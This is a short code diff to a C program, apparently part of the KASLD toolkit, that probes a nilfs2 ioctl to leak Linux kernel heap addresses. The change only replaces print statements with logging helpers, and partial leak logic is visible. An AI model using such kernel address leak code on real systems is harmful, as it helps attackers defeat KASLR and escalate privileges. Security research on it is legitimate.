@@ -41,6 +41,7 @@
 
 #define _GNU_SOURCE
 #include "include/kasld/api.h"
+#include "include/kasld/cli.h"
 #include <errno.h>
 #include <fcntl.h>
 #include <stdint.h>
@@ -110,7 +111,7 @@ static int open_nilfs2_fd(void) {
         fclose(fp);
         fd = open(mountpoint, O_RDONLY | O_DIRECTORY);
         if (fd >= 0) {
-          printf("[.] found nilfs2 mount at %s\n", mountpoint);
+          kasld_info("found nilfs2 mount at %s", mountpoint);
           return fd;
         }
       }
@@ -145,7 +146,7 @@ static unsigned long try_leak(int nilfs_fd) {
    * request as `unsigned long int`). */
   if (ioctl(nilfs_fd, (int)NILFS_IOCTL_GET_SUINFO, &argv) < 0) {
     if (errno == ENOTTY || errno == EINVAL)
-      fprintf(stderr, "[-] NILFS_IOCTL_GET_SUINFO not supported\n");
+      kasld_err("NILFS_IOCTL_GET_SUINFO not supported");
     else
       perror("[-] ioctl NILFS_IOCTL_GET_SUINFO");
     if (errno == ENOTTY || errno == EINVAL)
@@ -180,11 +181,11 @@ int main(void) {
   int fd;
   unsigned long addr;
 
-  printf("[.] trying nilfs2 NILFS_IOCTL_GET_SUINFO heap leak ...\n");
+  kasld_info("trying nilfs2 NILFS_IOCTL_GET_SUINFO heap leak ...");
 
   fd = open_nilfs2_fd();
   if (fd < 0) {
-    printf("[-] no nilfs2 mount found\n");
+    kasld_err("no nilfs2 mount found");
     return 0;
   }
 
@@ -203,6 +204,6 @@ int main(void) {
   }
 
   close(fd);
-  printf("[-] no kernel address leaked via nilfs2 ioctl\n");
+  kasld_err("no kernel address leaked via nilfs2 ioctl");
   return 0;
 }
